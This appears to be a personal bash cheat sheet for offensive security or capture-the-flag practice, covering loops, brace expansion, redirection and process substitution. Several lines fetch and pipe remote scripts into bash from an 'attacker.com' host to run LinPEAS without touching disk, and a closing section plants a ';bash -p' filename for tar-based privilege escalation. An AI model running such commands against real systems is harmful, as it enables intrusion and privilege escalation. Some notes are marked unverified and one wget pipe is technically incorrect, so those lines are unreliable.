# bash_isms

## essentials

> bash default vars
```bash
echo $?      # gives error code of most recently run command
```


> keystrokes and hotkeys
```sh
alt+.  # hotkey for use last argument
cd -   # cd to last working dir
ctrl+r # reverse search previous cmds, press multiple times to see next result
```


> for loop
```bash
for i in {0..100}; do  CMD; done
also works for command execs: 
for i in $(cat wordlist.txt); do curl http://IP/$i; done
```


> Brace expansion; similar to * operator on iterables in python *(python implentation of explode)*
```bash
cat {file1,file2,file3} 	 	; will cat those file

# useful for 
mkdir dir{1..4} dirA{1..8}
wget http://MY_IP/{file1,file2} 	
# could even do a loop style brace expansion of numbers or letters here
# such as {1..2}

# other examples
echo {a..z}
echo {1..-5}
```


## advanced

> redirection
```sh
# can be used to issue commands into a binary
./BINARY < exploit.txt
# exploit.txt must contain 1 input per line

# can wget a bash script and pipe it into bash to execute a hosted script
wget http://IP/SCRIPT | bash

# can run linpeas without touching disk
bash < <(curl http://attacker.com/LINPEAS)
```

> file descriptor; a note on `<(curl http://attacker.com/LINPEAS)`
```bash
# this yields a file descriptor, it is NOT redirection
# file descriptors can loosely be thought of like pointers
<(curl http://attacker.com/LINPEAS)

# the following works because bash can read files
bash <(curl http://attacker.com/LINPEAS)

# this can be demonstrated with with the tr command
# tr does not have the ability to read files
#
# the following fails
tr -cd '[[:space:]]' <(seq 1 10)
# the following succeeds
tr -cd '[[:space:]]' < <(seq 1 10)

# reference
https://askubuntu.com/questions/564380/alternative-for-pipe-operator
```


> advanced redirection, i am calling this bidirection
```shell
while read -r line; echo "prefix-$line";done < wordlist > outfile
```


> use ENV vars in your bash scripting by: ***(unverified)***
```bash
${ENV_VARIABLE} 		; perhaps un-exported?

similar to $my_var
```


## other notes

> a note on mkdir; creating a path of dirs
```bash
mkdir -p dir1/dir2/dir3
```


> follow script directory traversal, potent for "day-start" and "new project" scripts. From a systems programming, perspective it is as if the `fork()` or `clone()` is not called (***UNVERIFIED***). The work is done by the parent itself. 
```shell
. script.sh
```


> file creation and "done with arguments", bad characters in file names
```sh
# When trying to create malicious filenames use:
# E.g. when doing tar GTFO bins priv esc 
touch -- ';bash -p' 

# alternatively, echo into malicous filenames
echo '' > ';bash -p' 
```




